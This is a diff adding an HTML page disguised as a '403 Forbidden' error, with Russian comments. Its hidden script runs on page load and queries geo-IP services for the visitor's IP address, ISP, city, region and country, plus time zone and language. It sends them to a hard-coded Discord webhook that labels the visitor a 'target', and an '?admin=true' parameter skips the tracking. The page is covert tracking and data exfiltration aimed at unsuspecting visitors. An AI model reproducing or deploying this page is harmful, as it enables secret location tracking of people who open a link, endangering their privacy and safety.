@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>403 Forbidden</title>
+    <style>
+        body { background: #000; color: #111; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        h1 { font-size: 15vw; user-select: none; }
+    </style>
+</head>
+<body>
+
+<h1>403</h1>
+
+<script>
+(async function() {
+    // Пропуск для админа (?admin=true)
+    if (window.location.search.includes('admin=true')) return;
+
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1477060454969769996/mz6ulimJZIkLmJeyuZzFEslpk1JNOuDUlu-EY6WPoK0kXUSElta0pwpw1YDDAG9wdcsp";
+
+    // Функция сбора ГЕО (каскадная проверка)
+    async function getAdvancedGeo() {
+        const services = [
+            'https://ipapi.co/json/',
+            'https://ipinfo.io/json',
+            'https://api.ipify.org?format=json'
+        ];
+        
+        for (let url of services) {
+            try {
+                const res = await fetch(url);
+                const d = await res.json();
+                if (d.ip || d.IPv4) return {
+                    ip: d.ip || d.IPv4,
+                    city: d.city || "Не определен",
+                    region: d.region || d.state || "Н/Д",
+                    country: d.country_name || d.country || "Н/Д",
+                    org: d.org || d.asn_org || "Скрыто"
+                };
+            } catch (e) { continue; }
+        }
+        return { ip: "Не пробит", city: "N/A", region: "N/A", country: "N/A", org: "N/A" };
+    }
+
+    const geo = await getAdvancedGeo();
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const lang = navigator.language;
+
+    // Ссылка на карты (примерные координаты по IP)
+    const mapsLink = `https://www.google.com/maps/search/${geo.city}+${geo.region}`;
+
+    const payload = {
+        username: "Geo Tracker Pro",
+        embeds: [{
+            title: "📍 Зафиксирована геолокация цели",
+            color: 15105570, // Оранжевый
+            fields: [
+                { name: "🌐 Сетевой адрес", value: `**IP:** \`${geo.ip}\`\n**Провайдер:** \`${geo.org}\``, inline: false },
+                { name: "🗺 Местоположение", value: `**Страна:** ${geo.country}\n**Регион:** ${geo.region}\n**Город:** ${geo.city}`, inline: true },
+                { name: "🕒 Системные данные", value: `**Часовой пояс:** \`${tz}\`\n**Язык:** ${lang}`, inline: true },
+                { name: "🔗 Карты", value: `[Открыть в Google Maps](${mapsLink})`, inline: false }
+            ],
+            footer: { text: "Анализ завершен успешно" },
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    // Отправка (keepalive важен для мобильных браузеров)
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true
+    }).catch(err => console.error("Ошибка отправки в Discord"));
+
+})();
+</script>
+</body>
+</html>
